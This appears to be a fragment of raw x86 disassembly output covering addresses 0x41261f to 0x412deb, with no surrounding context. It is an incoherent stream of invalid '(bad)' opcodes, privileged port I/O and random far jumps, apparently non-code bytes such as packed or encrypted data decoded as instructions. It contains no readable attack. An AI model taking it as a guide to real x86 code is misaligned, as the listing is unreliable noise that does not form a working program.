  41261f:	xchg   ebx,eax
  412620:	inc    esp
  412621:	test   DWORD PTR [ebp-0x27],eax
  412624:	push   ebx
  412625:	das    
  412626:	jg     0x4125bc
  412628:	jg     0x41260b
  41262a:	mov    edi,0xcb89799
  41262f:	xchg   esi,eax
  412630:	sub    dh,BYTE PTR [edi+0x503933a6]
  412636:	cmp    al,0x89
  412638:	div    DWORD PTR [ebx+0xe]
  41263b:	cmp    bh,BYTE PTR [eax]
  41263d:	repnz (bad) 
  41263f:	push   DWORD PTR ds:0xf906b1b4
  412645:	ret    
  412646:	fs mov edx,0x825ec6e
  41264c:	xchg   BYTE PTR [esi+ebp*2],ch
  41264f:	mov    al,ds:0x5ee640f9
  412654:	sbb    DWORD PTR [ecx+0x42],esp
  412657:	mov    ah,0x89
  412659:	pop    ss
  41265a:	sar    BYTE PTR [eax],0xfa
  41265d:	lods   al,BYTE PTR ds:[esi]
  41265e:	or     eax,0x4b097aea
  412663:	adc    al,0x9d
  412665:	adc    BYTE PTR [eax-0x1b388b74],dh
  41266b:	cld    
  41266c:	add    BYTE PTR [ecx+0x57],ah
  41266f:	mov    esi,ecx
  412671:	xchg   edx,eax
  412672:	mov    bh,0xe
  412674:	std    
  412675:	mov    ecx,DWORD PTR [edx]
  412677:	sahf   
  412678:	push   esi
  412679:	sub    al,0xf2
  41267b:	mov    eax,0x6529ee5c
  412680:	pminsw mm4,QWORD PTR [edi+0x4f]
  412684:	imul   edi,DWORD PTR [edi+0xc],0xffffffc3
  412688:	and    BYTE PTR [ecx+0x1f],dl
  41268b:	aas    
  41268c:	into   
  41268d:	test   eax,0xb7ff736a
  412692:	inc    edx
  412693:	jne    0x412655
  412695:	sub    cl,bh
  412697:	mov    bl,dh
  412699:	jge    0x4126af
  41269b:	cmp    al,0xee
  41269d:	pop    ds
  41269e:	int3   
  41269f:	add    DWORD PTR [ebp-0x45290409],ecx
  4126a5:	out    dx,al
  4126a6:	or     eax,0x30324f7c
  4126ab:	imul   eax,edx,0xbe73c14f
  4126b1:	fimul  WORD PTR [esi+0x43220c1b]
  4126b7:	and    DWORD PTR [edi-0x33],ebx
  4126ba:	mov    eax,0x3b1a942c
  4126bf:	rol    DWORD PTR [eax],1
  4126c1:	les    esp,FWORD PTR ds:0x1b1ca823
  4126c7:	add    ebp,DWORD PTR [ebp-0x6e6e2b4b]
  4126cd:	dec    esi
  4126ce:	ficom  DWORD PTR [eax]
  4126d0:	out    dx,al
  4126d1:	jmp    FWORD PTR [ebx+edi*8+0x74319743]
  4126d8:	push   ds
  4126d9:	ins    BYTE PTR es:[edi],dx
  4126da:	aad    0xaa
  4126dc:	retf   
  4126dd:	jne    0x4126cb
  4126df:	(bad)  
  4126e0:	cmp    al,0x7f
  4126e2:	push   es
  4126e3:	inc    edi
  4126e4:	dec    edi
  4126e5:	or     ah,BYTE PTR [eax-0xf6b554a]
  4126eb:	push   ebx
  4126ec:	pop    ds
  4126ed:	push   0x31
  4126ef:	lods   al,BYTE PTR ds:[esi]
  4126f0:	(bad)  
  4126f1:	fdivr  st,st(5)
  4126f3:	jmp    0x412759
  4126f5:	jb     0x4126a1
  4126f7:	aam    0x92
  4126f9:	mov    dh,al
  4126fb:	sbb    eax,0xdabfe373
  412700:	jp     0x41274a
  412702:	pop    edx
  412703:	stos   DWORD PTR es:[edi],eax
  412704:	iret   
  412705:	mov    al,0x73
  412707:	jnp    0x4126aa
  412709:	push   es
  41270a:	pop    edx
  41270b:	sbb    BYTE PTR [edi+0x15],0xe0
  41270f:	mov    ah,0x9a
  412711:	inc    edx
  412712:	push   ss
  412713:	sub    BYTE PTR [edi-0x20],bh
  412716:	scas   eax,DWORD PTR es:[edi]
  412717:	ret    0xda39
  41271a:	popa   
  41271b:	ficomp DWORD PTR [ecx-0x68a1b021]
  412721:	sti    
  412722:	inc    esi
  412723:	jns    0x4126ec
  412725:	das    
  412726:	cmp    BYTE PTR [edi-0x28],0xfa
  41272a:	leave  
  41272b:	or     ebx,DWORD PTR [edx]
  41272d:	fstp   TBYTE PTR [ecx]
  41272f:	fist   DWORD PTR [ecx]
  412731:	scas   eax,DWORD PTR es:[edi]
  412732:	in     al,0xd6
  412734:	aam    0x66
  412736:	std    
  412737:	xchg   esp,eax
  412738:	pop    ebx
  412739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41273a:	pop    es
  41273b:	mov    ch,0x45
  41273d:	mov    al,0xe4
  41273f:	iret   
  412740:	cmp    eax,0xa9eed87a
  412745:	dec    esp
  412746:	sti    
  412747:	mov    edx,DWORD PTR [ecx-0x4f]
  41274a:	xchg   ecx,eax
  41274b:	mov    bh,0xd5
  41274d:	mov    dl,0x9c
  41274f:	cmc    
  412750:	push   cs
  412751:	push   es
  412752:	mov    al,ds:0x3c480ff4
  412757:	retf   0xa460
  41275a:	mov    esi,0x6582480f
  41275f:	or     eax,0x59463081
  412764:	out    dx,eax
  412765:	push   esi
  412766:	ret    
  412767:	shr    BYTE PTR [ebx+0x759a1ec8],0xde
  41276e:	push   edi
  41276f:	pop    ebp
  412770:	outs   dx,DWORD PTR ds:[esi]
  412771:	jp     0x4127cd
  412773:	push   esi
  412774:	das    
  412775:	push   edx
  412776:	iret   
  412777:	sub    edi,DWORD PTR [esi+0x74]
  41277a:	in     al,dx
  41277b:	jmp    0x1bdcd34c
  412780:	cmp    DWORD PTR [esp+eiz*8-0x55],0x6efff57b
  412788:	repnz push edx
  41278a:	dec    ebx
  41278b:	xchg   ebx,eax
  41278c:	dec    ebp
  41278d:	push   edi
  41278e:	cwde   
  41278f:	bound  esp,QWORD PTR [esi+ebp*4+0x2b4a3f1e]
  412796:	mov    edi,0xd72a76f0
  41279b:	add    esi,esi
  41279d:	push   eax
  41279e:	jl     0x412801
  4127a0:	sub    eax,0x47a32e0c
  4127a5:	jns    0x41273e
  4127a7:	pop    ebx
  4127a8:	into   
  4127a9:	mov    al,ds:0x2e1175ef
  4127ae:	lds    ebx,FWORD PTR [edi]
  4127b0:	ficom  DWORD PTR [edi-0x75]
  4127b3:	scas   eax,DWORD PTR es:[edi]
  4127b4:	jns    0x4127ee
  4127b6:	cmp    eax,0x111d37de
  4127bb:	dec    ebp
  4127bc:	mov    ds:0x77146e7a,eax
  4127c1:	xor    eax,0xeab872d0
  4127c6:	add    esp,DWORD PTR [esp+ebx*2-0xe]
  4127ca:	adc    eax,DWORD PTR [ebp+0x29f78632]
  4127d0:	les    edi,FWORD PTR [edi-0x684d1ebe]
  4127d6:	inc    edi
  4127d7:	(bad)  
  4127d8:	leave  
  4127d9:	pop    es
  4127da:	push   esi
  4127db:	ficom  DWORD PTR [edx+0x7a3fe9d9]
  4127e1:	js     0x41277c
  4127e3:	adc    cl,BYTE PTR [edi]
  4127e5:	sar    BYTE PTR ds:0xec422076,1
  4127eb:	adc    eax,0x1d2d211
  4127f0:	jmp    0x3e19:0x9277c2fd
  4127f7:	fscale 
  4127f9:	jmp    0x4127a3
  4127fb:	mov    ch,BYTE PTR [ecx-0x4667f7f1]
  412801:	or     eax,0x8593b308
  412806:	mov    dh,0xfe
  412808:	imul   ebp,DWORD PTR [edi],0x8554dfa0
  41280e:	xor    eax,0xcc58d48b
  412813:	sub    DWORD PTR [edi],eax
  412815:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412816:	pushf  
  412817:	push   ebx
  412818:	cmp    edi,DWORD PTR [esi]
  41281a:	sub    BYTE PTR [ecx-0x56],0xad
  41281e:	jmp    0x6ebf:0xe349aeaf
  412825:	out    dx,al
  412826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412827:	ret    
  412828:	sbb    edx,edx
  41282a:	nop
  41282b:	xchg   esp,eax
  41282c:	xor    al,0x4a
  41282e:	test   DWORD PTR [edi+0x21c01489],0x65ff6bbd
  412838:	not    BYTE PTR [edx-0x8]
  41283b:	enter  0x997,0xe7
  41283f:	adc    BYTE PTR [edi+0x415ad4e],bh
  412845:	imul   edi,DWORD PTR [ecx-0x2ad29e03],0xffffff89
  41284c:	pop    ss
  41284d:	out    dx,eax
  41284e:	pop    esi
  41284f:	(bad)  
  412850:	inc    edi
  412851:	pusha  
  412852:	xor    DWORD PTR [esi],edi
  412854:	pushw  es
  412856:	mov    ecx,0xf98d0f92
  41285b:	lahf   
  41285c:	xor    al,0xd0
  41285e:	adc    ah,BYTE PTR [eax+ebp*4+0xae61c90]
  412865:	adc    bl,ch
  412867:	mov    ebx,0x9f6d120c
  41286c:	ficom  DWORD PTR ds:0xd57b605a
  412872:	fimul  WORD PTR [eax-0x45312cfd]
  412878:	xchg   ecx,eax
  412879:	xchg   BYTE PTR [esi-0x33],cl
  41287c:	pop    esi
  41287d:	iret   
  41287e:	inc    edi
  41287f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412880:	(bad)  
  412881:	mov    dl,0x4c
  412883:	pop    ebp
  412884:	jnp    0x41288a
  412886:	mov    al,ds:0xdf474b11
  41288b:	dec    ebx
  41288c:	jns    0x4128a5
  41288e:	sub    ah,bl
  412890:	lock mov ebp,DWORD PTR [esi+0x7cf23945]
  412897:	(bad)  
  412898:	fsub   st,st(4)
  41289a:	(bad)  
  41289c:	inc    edi
  41289d:	lock mov ds:0x33256592,eax
  4128a3:	ja     0x412918
  4128a5:	repz mov al,ds:0x7b170bc7
  4128ab:	jo     0x412835
  4128ad:	bnd call 0x464314ca
  4128b3:	pop    edi
  4128b4:	inc    edi
  4128b5:	fldcw  WORD PTR [di]
  4128b8:	mov    bh,0xf6
  4128ba:	mov    ds:0x3daba19b,al
  4128bf:	test   al,0x33
  4128c1:	or     bl,BYTE PTR [esi]
  4128c3:	in     eax,0xa9
  4128c5:	or     DWORD PTR ss:[eax],esp
  4128c8:	mov    edx,0x56ce533a
  4128cd:	xor    ecx,DWORD PTR [eax+0x1c1aa5e7]
  4128d3:	cwde   
  4128d4:	shl    BYTE PTR [ebx+0x42445aee],0x6
  4128db:	daa    
  4128dc:	stos   DWORD PTR es:[edi],eax
  4128dd:	(bad)  
  4128de:	pushf  
  4128df:	mov    ch,ah
  4128e1:	sub    eax,0x986050d1
  4128e6:	popa   
  4128e7:	jle    0x412932
  4128e9:	ficomp DWORD PTR [edx-0x38]
  4128ec:	inc    edi
  4128ed:	push   cs
  4128ee:	add    WORD PTR [edx],ax
  4128f1:	jge    0x412947
  4128f3:	ds int3 
  4128f5:	clc    
  4128f6:	dec    eax
  4128f7:	out    dx,al
  4128f8:	aam    0x2b
  4128fa:	pop    esp
  4128fb:	jge    0x4128af
  4128fd:	dec    edx
  4128fe:	jb     0x41292d
  412900:	subps  xmm0,XMMWORD PTR [edi-0xb5ea86f]
  412907:	push   esp
  412908:	bound  esp,QWORD PTR [eax+eiz*8-0x69d882bc]
  41290f:	out    dx,al
  412910:	pop    ebp
  412911:	xchg   DWORD PTR [ecx+eiz*1+0x1c],edx
  412915:	jmp    DWORD PTR [esi+ecx*8+0xe]
  412919:	xor    DWORD PTR [eax],edx
  41291b:	push   0x7
  41291d:	daa    
  41291e:	inc    eax
  41291f:	dec    esp
  412920:	push   edi
  412921:	sti    
  412922:	sub    bh,BYTE PTR [ebp-0x498dbe5a]
  412928:	mov    ds:0x94b4f793,eax
  41292d:	inc    edx
  41292e:	mov    bh,0xde
  412930:	inc    ebp
  412931:	js     0x41296a
  412933:	loope  0x412951
  412935:	mov    ch,0xdd
  412937:	pop    ebp
  412938:	pop    esi
  412939:	fadd   DWORD PTR [edi]
  41293b:	repz mov al,0xa6
  41293e:	or     DWORD PTR [ebp+0x4d],edx
  412941:	jmp    FWORD PTR [ecx]
  412943:	in     eax,dx
  412944:	adc    DWORD PTR [eax-0x8366273],ebp
  41294a:	outs   dx,DWORD PTR ds:[esi]
  41294b:	(bad)
  41294e:	add    bh,BYTE PTR [edx-0x5f8caee]
  412954:	call   0x4bbd:0x636be248
  41295b:	es test al,0xb4
  41295e:	lods   al,BYTE PTR ds:[esi]
  41295f:	lods   al,BYTE PTR ds:[esi]
  412960:	popf   
  412961:	arpl   bx,cx
  412963:	lock fs adc al,0xf
  412967:	push   es
  412968:	sub    al,0x11
  41296a:	dec    eax
  41296b:	mov    edx,ss
  41296d:	sub    DWORD PTR [edx-0x45],ebp
  412970:	mov    ah,0xf9
  412972:	and    dl,BYTE PTR [edx]
  412974:	repnz inc eax
  412976:	mov    ds:0xf0f6884d,eax
  41297b:	loope  0x412966
  41297d:	icebp  
  41297e:	cmp    al,0x4f
  412980:	pop    ebx
  412981:	ror    cl,cl
  412983:	and    eax,DWORD PTR [ebp+ecx*4+0x25]
  412987:	clc    
  412988:	nop
  412989:	sbb    bh,al
  41298b:	add    eax,0x8d119b73
  412990:	mov    DWORD PTR [edi],eax
  412992:	div    ebp
  412994:	xor    ah,BYTE PTR [ebx]
  412996:	icebp  
  412997:	sbb    eax,0x20aabf4a
  41299c:	cmp    al,0x21
  41299e:	mov    BYTE PTR [edx],al
  4129a0:	xchg   BYTE PTR [ecx-0x76],ah
  4129a3:	jne    0x4129b0
  4129a5:	or     ebx,edx
  4129a7:	sub    al,ch
  4129a9:	sbb    ebx,DWORD PTR [ecx+eax*2+0x72]
  4129ad:	into   
  4129ae:	sbb    al,BYTE PTR [edi-0x5c88ab58]
  4129b4:	inc    esp
  4129b5:	je     0x4129f8
  4129b7:	mul    BYTE PTR [esi-0x83b3d75]
  4129bd:	push   ecx
  4129be:	into   
  4129bf:	cmc    
  4129c0:	pop    ecx
  4129c1:	js     0x412a08
  4129c3:	cmp    esi,DWORD PTR [ebx+0x56558bbf]
  4129c9:	and    cl,BYTE PTR [edx+0xf7ad445]
  4129cf:	jb     0x412994
  4129d1:	xchg   esi,eax
  4129d2:	cwde   
  4129d3:	adc    al,0xec
  4129d5:	and    cl,ah
  4129d7:	clc    
  4129d8:	mov    DWORD PTR [eax],ecx
  4129da:	int3   
  4129db:	or     ebx,DWORD PTR [edx-0x24e4a66c]
  4129e1:	test   esi,edx
  4129e3:	add    DWORD PTR [esi+0x75c6880],eax
  4129e9:	test   BYTE PTR [ebx+edi*4],dh
  4129ec:	mov    ch,0x61
  4129ee:	sti    
  4129ef:	sahf   
  4129f0:	leave  
  4129f1:	cli    
  4129f2:	bound  ebp,QWORD PTR [esi]
  4129f4:	loop   0x4129fa
  4129f6:	fs (bad) 
  4129f9:	push   ss
  4129fa:	jbe    0x412a21
  4129fc:	and    al,BYTE PTR [edi+0x1430f081]
  412a02:	lods   al,BYTE PTR ds:[esi]
  412a03:	outs   dx,BYTE PTR ds:[esi]
  412a04:	mov    ebp,edx
  412a06:	and    eax,0x541a95c2
  412a0b:	dec    ebx
  412a0c:	ret    0x1ad2
  412a0f:	dec    edi
  412a10:	gs jmp 0xeea5:0xe47470d5
  412a18:	push   edx
  412a19:	or     DWORD PTR [ebp-0x7],edi
  412a1c:	jne    0x412a76
  412a1e:	xor    DWORD PTR [ebx-0x246a52e9],ecx
  412a24:	imul   ebx,esp,0x31de309c
  412a2a:	sub    BYTE PTR [edx+edi*4+0x17],cl
  412a2e:	scas   al,BYTE PTR es:[edi]
  412a2f:	xor    al,ah
  412a31:	jo     0x412a8a
  412a33:	test   eax,0xcb6116bf
  412a38:	inc    edi
  412a39:	xchg   DWORD PTR ds:0xc31e91df,edi
  412a3f:	fcomip st,st(4)
  412a41:	sub    al,0x7d
  412a43:	mov    ebp,0xf2660dc1
  412a48:	js     0x412a0b
  412a4a:	clc    
  412a4b:	fisttp QWORD PTR [edx+ebp*1+0x5027efae]
  412a52:	xchg   edi,eax
  412a53:	imul   esp,eax,0x52
  412a56:	pop    ecx
  412a57:	xor    al,0xf5
  412a59:	xchg   BYTE PTR [esi+0x28],dl
  412a5c:	loopne 0x4129df
  412a5e:	call   0xc67d:0x38ffdad8
  412a65:	es xchg edi,eax
  412a67:	pop    ebx
  412a68:	call   0xba2e69b
  412a6d:	jns    0x412a95
  412a6f:	lods   al,BYTE PTR ds:[esi]
  412a70:	lea    ecx,[eax+0x7e]
  412a73:	fstp   st(0)
  412a75:	icebp  
  412a76:	mov    al,0x59
  412a78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a79:	int    0x5a
  412a7b:	mov    ah,0xaa
  412a7d:	adc    ebp,DWORD PTR [eax]
  412a7f:	cwde   
  412a80:	xchg   edx,eax
  412a81:	es mov ebx,0x9d5cf6b0
  412a87:	jne    0x412aae
  412a89:	fst    QWORD PTR [eax-0x2d0dee7b]
  412a8f:	add    BYTE PTR [ecx+0x2c],ch
  412a92:	leave  
  412a93:	adc    esi,ecx
  412a95:	shr    BYTE PTR [edx+0x55f6a4e3],0xbf
  412a9c:	int3   
  412a9d:	fyl2xp1 
  412a9f:	sub    eax,0xb3722d18
  412aa4:	imul   ebx,DWORD PTR ds:0x143f69ba,0xc7c7b468
  412aae:	mov    dh,cl
  412ab0:	jno    0x412b1c
  412ab2:	jne    0x412adf
  412ab4:	fwait
  412ab5:	sbb    bh,BYTE PTR [esi]
  412ab7:	mov    edi,0xca7fdecf
  412abc:	cmc    
  412abd:	and    ebp,DWORD PTR [ecx]
  412abf:	in     al,0x8c
  412ac1:	cld    
  412ac2:	add    al,BYTE PTR ds:0x3febb547
  412ac8:	add    al,0xa1
  412aca:	adc    bh,BYTE PTR [eax+edi*2]
  412acd:	scas   al,BYTE PTR es:[edi]
  412ace:	aas    
  412acf:	mov    edi,0x67b23a2a
  412ad4:	push   ds
  412ad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ad6:	inc    ebp
  412ad7:	std    
  412ad8:	mov    al,ds:0x1d450cbd
  412add:	inc    ebx
  412ade:	mov    bh,0x67
  412ae0:	push   ebp
  412ae1:	add    BYTE PTR [esi-0x71],dh
  412ae4:	je     0x412b32
  412ae6:	or     al,0xe4
  412ae8:	in     eax,dx
  412ae9:	data16 sbb al,BYTE PTR [eax+0xf]
  412aed:	adc    eax,0xa5e0f214
  412af2:	loope  0x412ab3
  412af4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412af5:	in     al,dx
  412af6:	or     edx,eax
  412af8:	(bad)  
  412af9:	jno    0x412b30
  412afb:	and    eax,0x77a908ca
  412b00:	or     ebp,DWORD PTR [eax+0x4290f36]
  412b06:	add    ebp,DWORD PTR [esi]
  412b08:	xchg   esp,eax
  412b09:	mov    eax,0x98408665
  412b0e:	push   ss
  412b0f:	xor    al,0x23
  412b11:	out    0x96,eax
  412b13:	lahf   
  412b14:	jge    0x412aa3
  412b16:	data16 mov dh,0x80
  412b19:	inc    ebp
  412b1a:	and    eax,DWORD PTR [edi+esi*2+0x31]
  412b1e:	fs ja  0x412af5
  412b21:	xor    al,0x2e
  412b23:	xor    eax,0xf745e1d7
  412b28:	xchg   edi,eax
  412b29:	ja     0x412b09
  412b2b:	jnp    0x412b4e
  412b2d:	xlat   BYTE PTR ds:[ebx]
  412b2e:	push   esi
  412b2f:	repz push cs
  412b31:	sub    eax,0xca210ab7
  412b36:	out    dx,al
  412b37:	mov    bl,0xde
  412b39:	xchg   esp,eax
  412b3a:	outs   dx,DWORD PTR ds:[esi]
  412b3b:	cli    
  412b3c:	push   ebp
  412b3d:	xchg   ebp,eax
  412b3e:	leave  
  412b3f:	adc    ebx,DWORD PTR ds:[eax+0xd]
  412b43:	xchg   edx,eax
  412b44:	je     0x412bab
  412b46:	ins    BYTE PTR es:[edi],dx
  412b47:	push   cs
  412b48:	and    DWORD PTR [esi-0x1121c829],esi
  412b4e:	sbb    al,BYTE PTR [ebp+0x4e]
  412b51:	sahf   
  412b52:	mov    bl,BYTE PTR [ecx+ebp*1+0x23]
  412b56:	mov    ecx,0x6de41da9
  412b5b:	pop    es
  412b5c:	in     al,0x51
  412b5e:	sbb    esi,DWORD PTR [esi-0x405152db]
  412b64:	shl    BYTE PTR [ebx],0x7e
  412b67:	sbb    DWORD PTR [ebx+0x137a87b8],esp
  412b6d:	sub    dh,ch
  412b6f:	sahf   
  412b70:	js     0x412b4d
  412b72:	gs xchg ecx,eax
  412b74:	sar    DWORD PTR [esi+0x51],0xdc
  412b78:	lods   eax,DWORD PTR ds:[esi]
  412b79:	cmc    
  412b7a:	lea    ebp,[ebx]
  412b7c:	shl    DWORD PTR [edx-0x27e00fbd],cl
  412b82:	dec    ebx
  412b83:	xchg   edx,eax
  412b84:	test   eax,0x4b26ef94
  412b89:	jle    0x412bd6
  412b8b:	xchg   ebx,eax
  412b8c:	cmp    eax,0xdaf462e8
  412b91:	cmp    dh,BYTE PTR [ebx-0x64d28b19]
  412b97:	and    ecx,ecx
  412b99:	arpl   sp,cx
  412b9b:	xchg   edx,eax
  412b9c:	stos   BYTE PTR es:[edi],al
  412b9d:	(bad)
  412ba2:	int3   
  412ba3:	mov    esp,gs
  412ba5:	sub    cl,BYTE PTR [ecx-0x13]
  412ba8:	cwde   
  412ba9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412baa:	shr    ebx,1
  412bac:	mov    BYTE PTR [ebx+ebp*8+0x55],dh
  412bb0:	test   ebp,ecx
  412bb2:	inc    edi
  412bb3:	test   DWORD PTR [ecx],edi
  412bb5:	mov    ch,0x95
  412bb7:	icebp  
  412bb8:	sub    dl,BYTE PTR [esi-0x672542e7]
  412bbe:	ret    0xc4ce
  412bc1:	ret    0xf91d
  412bc4:	pop    ss
  412bc5:	jb     0x412b6b
  412bc7:	cmp    eax,0x24cfa46
  412bcc:	outs   dx,BYTE PTR ds:[esi]
  412bcd:	lods   eax,DWORD PTR ds:[esi]
  412bce:	adc    esp,DWORD PTR [edx]
  412bd0:	icebp  
  412bd1:	ror    BYTE PTR [ecx+0x395ffc60],cl
  412bd7:	cmp    BYTE PTR [eax+0x28],bl
  412bda:	aad    0x35
  412bdc:	imul   ecx,ebp,0xffffffb3
  412bdf:	test   BYTE PTR [ebx-0x44],ch
  412be2:	(bad)  
  412be4:	mov    bl,dl
  412be6:	xchg   ecx,eax
  412be7:	scas   eax,DWORD PTR es:[edi]
  412be8:	loope  0x412bba
  412bea:	add    eax,0xd749b3b2
  412bef:	aad    0x33
  412bf1:	pop    ebx
  412bf2:	cmp    al,0x6f
  412bf4:	push   ebp
  412bf5:	jecxz  0x412bb3
  412bf7:	mov    edi,0x667262e1
  412bfc:	cmp    al,0xbb
  412bfe:	lods   eax,DWORD PTR ds:[esi]
  412bff:	xor    ebx,DWORD PTR [ecx-0x65]
  412c02:	inc    esp
  412c03:	aam    0xe
  412c05:	fist   WORD PTR [ebp*8+0x54efb7e6]
  412c0c:	lock xor al,BYTE PTR [edi-0x19aa3276]
  412c13:	out    dx,al
  412c14:	adc    eax,0x1f0fd3b5
  412c19:	xor    ch,0x8c
  412c1c:	das    
  412c1d:	sub    dl,BYTE PTR [ecx]
  412c1f:	ins    BYTE PTR es:[edi],dx
  412c20:	std    
  412c21:	push   ebp
  412c22:	popa   
  412c23:	or     dl,BYTE PTR [eax+0x0]
  412c26:	ret    
  412c27:	addps  xmm2,XMMWORD PTR [edx+0x286cbb2d]
  412c2e:	hlt    
  412c2f:	loope  0x412bf5
  412c31:	mov    dl,0xca
  412c33:	in     al,dx
  412c34:	xchg   ecx,eax
  412c35:	into   
  412c36:	jl     0x412bc4
  412c38:	and    BYTE PTR [eax],bl
  412c3a:	push   edx
  412c3b:	push   0xffffffd0
  412c3d:	pop    ebp
  412c3e:	(bad)  
  412c3f:	loope  0x412c6f
  412c41:	xchg   esp,eax
  412c42:	inc    edx
  412c43:	mov    al,0xb0
  412c45:	cwde   
  412c46:	pusha  
  412c47:	cmp    al,0x80
  412c49:	cld    
  412c4a:	mov    al,0xba
  412c4c:	mov    ds:0x3067e71f,al
  412c51:	pusha  
  412c52:	adc    DWORD PTR [eax+0x39376ca],ebx
  412c58:	repnz sub DWORD PTR [esi],ecx
  412c5b:	int    0x67
  412c5d:	xchg   edi,eax
  412c5e:	push   es
  412c5f:	xor    ebx,DWORD PTR [ecx]
  412c61:	or     eax,0x53529eb4
  412c66:	rol    BYTE PTR [eax],cl
  412c68:	sub    eax,0xd0956e4d
  412c6d:	push   esp
  412c6e:	leave  
  412c6f:	xlat   BYTE PTR ds:[ebx]
  412c70:	fist   DWORD PTR [eax-0x60]
  412c73:	cmp    BYTE PTR [ecx+edx*4-0x2a],cl
  412c77:	test   DWORD PTR [ebx+0x1884d321],edi
  412c7d:	or     DWORD PTR [eax+0x3678d20b],0xffffffa4
  412c84:	cmp    al,bl
  412c86:	pop    ebx
  412c87:	loopne 0x412d01
  412c89:	inc    esi
  412c8a:	and    BYTE PTR [edx+eiz*8+0x1d84f0d],0x57
  412c92:	pop    eax
  412c93:	lods   al,BYTE PTR ds:[esi]
  412c94:	push   ds
  412c95:	(bad)  
  412c96:	pop    ds
  412c97:	pop    ebx
  412c98:	mov    eax,ds:0x57fd2a80
  412c9d:	xchg   ebx,eax
  412c9e:	in     al,0x91
  412ca0:	ja     0x412d03
  412ca2:	jg     0x412c90
  412ca4:	sbb    ecx,DWORD PTR [edi]
  412ca6:	jne    0x412c2e
  412ca8:	mov    ecx,0xa27afbad
  412cad:	mov    BYTE PTR [ebp+0x65832afb],al
  412cb3:	adc    ch,0xb0
  412cb6:	mov    edx,0xae365305
  412cbb:	shr    BYTE PTR [edi+0x6b98cb3d],cl
  412cc1:	mov    dh,0x36
  412cc3:	mov    edi,0x9c8af7bd
  412cc8:	outs   dx,DWORD PTR ds:[esi]
  412cc9:	push   0xcbaa1b5
  412cce:	inc    edi
  412ccf:	dec    ebx
  412cd1:	pop    ecx
  412cd2:	test   eax,0x856d5e7f
  412cd7:	pop    ss
  412cd8:	mov    al,cl
  412cda:	push   0xb97a1d52
  412cdf:	cli    
  412ce0:	fidiv  DWORD PTR [ecx-0x708d909b]
  412ce6:	call   FWORD PTR [eax+0x55]
  412ce9:	xchg   DWORD PTR [eax],ebx
  412ceb:	jp     0x412cd9
  412ced:	cmp    dh,BYTE PTR [edx-0x2a]
  412cf0:	call   0xb58c:0x64dd6330
  412cf7:	sub    ebp,ebp
  412cf9:	mov    al,ds:0x973aee85
  412cfe:	mov    ds:0xefec8839,eax
  412d03:	and    BYTE PTR [ecx],cl
  412d05:	pusha  
  412d06:	mov    bh,BYTE PTR [eax+0x72]
  412d09:	dec    edx
  412d0a:	pop    eax
  412d0b:	mov    al,0xd1
  412d0d:	mov    esp,edx
  412d0f:	sub    DWORD PTR [edx-0x35],0xb4956a71
  412d16:	adc    BYTE PTR [edx-0x632cece7],al
  412d1c:	push   ebp
  412d1d:	lock dec ebp
  412d1f:	fidivr WORD PTR [ecx-0x40]
  412d22:	out    0x6e,al
  412d24:	outs   dx,BYTE PTR ds:[esi]
  412d25:	jnp    0x412d05
  412d27:	in     al,0x4
  412d29:	popf   
  412d2a:	imul   ebx,ebp,0x2feaccfd
  412d30:	enter  0xd09a,0x98
  412d34:	(bad)  
  412d35:	dec    ebx
  412d36:	mov    ecx,0xf8418be
  412d3b:	fisubr WORD PTR [esi+0x40]
  412d3e:	fisttp WORD PTR [eax+eax*1]
  412d41:	sti    
  412d42:	shr    DWORD PTR [esi+0x2a],0x69
  412d46:	jo     0x412d09
  412d48:	pop    esi
  412d49:	push   0xc8e335b3
  412d4e:	stc    
  412d4f:	sbb    BYTE PTR [edx-0x50],bh
  412d52:	jns    0x412dc0
  412d54:	push   cs
  412d55:	mov    esi,0x2bf67c4b
  412d5a:	iret   
  412d5b:	mov    edi,0x443be9b8
  412d60:	xor    DWORD PTR [edi-0x68],edi
  412d63:	mov    al,0x15
  412d65:	stc    
  412d66:	das    
  412d67:	and    edx,0xc1b1a5b5
  412d6d:	repnz aaa 
  412d6f:	add    BYTE PTR [ebp-0xc14db57],cl
  412d75:	mov    esp,0xc233fe7b
  412d7a:	dec    ecx
  412d7b:	nop
  412d7c:	xchg   ecx,eax
  412d7d:	push   edi
  412d7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d7f:	adc    BYTE PTR [eax],0xe4
  412d82:	pop    esi
  412d83:	ins    BYTE PTR es:[edi],dx
  412d84:	sub    eax,0xe347e099
  412d89:	popf   
  412d8a:	mov    DWORD PTR [ebx],esi
  412d8c:	inc    ebp
  412d8d:	paddsw mm1,QWORD PTR [esi+0x25052de]
  412d94:	push   0xffffffc8
  412d96:	data16 (bad) 
  412d98:	jne    0x412d4a
  412d9a:	or     ebp,DWORD PTR [esi-0x41]
  412d9d:	jge    0x412db0
  412d9f:	mov    cl,0x4d
  412da1:	ficom  DWORD PTR [ecx-0x18]
  412da4:	dec    edx
  412da5:	xlat   BYTE PTR ds:[ebx]
  412da6:	dec    ebp
  412da7:	pop    ds
  412da8:	mov    esp,0x4d0cf834
  412dad:	shl    dh,cl
  412daf:	mov    dh,BYTE PTR [edx+0x3a4ca9ec]
  412db5:	cmp    eax,0xef497a0d
  412dba:	test   DWORD PTR [ebx],esi
  412dbc:	adc    eax,0xf6e9243a
  412dc1:	stos   BYTE PTR es:[edi],al
  412dc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dc3:	arpl   WORD PTR [ecx+ebp*4],di
  412dc6:	mov    ds:0xa783fd7a,eax
  412dcb:	out    dx,al
  412dcc:	lahf   
  412dcd:	inc    edx
  412dce:	das    
  412dcf:	adc    DWORD PTR [eax-0x2f2ab72e],edx
  412dd5:	clc    
  412dd6:	sbb    ebx,DWORD PTR [esi]
  412dd8:	pop    es
  412dd9:	or     al,0xe
  412ddb:	dec    esi
  412ddc:	sbb    BYTE PTR [eax+ecx*2-0x36],ah
  412de0:	leave  
  412de1:	in     eax,0xe3
  412de3:	test   eax,0x92e06927
  412de8:	std    
  412de9:	dec    esi
  412dea:	inc    esp
  412deb:	dec    esi
